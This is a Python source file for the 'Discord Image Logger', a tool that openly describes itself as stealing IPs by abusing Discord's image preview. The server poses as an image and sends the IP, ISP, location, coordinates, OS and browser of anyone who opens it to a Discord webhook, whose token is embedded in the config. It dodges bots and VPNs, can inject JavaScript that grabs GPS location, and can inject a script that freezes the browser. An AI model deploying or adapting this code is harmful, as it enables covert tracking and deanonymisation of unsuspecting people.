# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1123514146839867423/f3XXLITJOV67vOeDgJ8hv-oLYVcWW0UDvLoh9kTATFcoXK-KlBOLFkjHnMiD2oDRY6xm",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
